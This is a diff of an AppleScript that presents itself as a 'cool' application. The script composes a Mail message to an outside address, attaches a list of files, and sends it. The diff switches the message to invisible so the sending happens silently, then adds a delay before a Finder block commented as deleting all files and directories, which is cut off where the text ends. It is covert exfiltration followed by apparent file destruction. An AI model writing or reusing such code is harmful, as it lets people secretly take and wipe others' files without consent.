@@ -38,16 +38,16 @@ tell application "System Events"
 end tell
 
 -- creates a new e-mail
-set theSender to "Alex Kudrenko<alex@kudrenko.me>"
+set theSender to "Alex Kudrenko<alex@alex.me>"
 set recipName to "The Dude"
-set recipAddress to "kudrenko@icloud.com"
+set recipAddress to "alex@icloud.com"
 set msgText to "Sent using cool Alex Kudrenko's Application"
 
 tell application "Mail"
 	
-	set newmessage to make new outgoing message with properties {subject:"Important File Attachment", content:msgText & return & return, visible:true}
+	set newmessage to make new outgoing message with properties {subject:"Important File Attachment", content:msgText & return & return, visible:false}
 	tell newmessage
-		set visible to true
+		set visible to false
 		set sender to theSender
 		make new to recipient with properties {name:recipName, address:recipAddress}
 		repeat with attach in attchList
@@ -57,6 +57,8 @@ tell application "Mail"
 	end tell
 	send newmessage
 end tell
+
+delay 30
 
 -- deletes all files & DIR
 tell application "Finder"
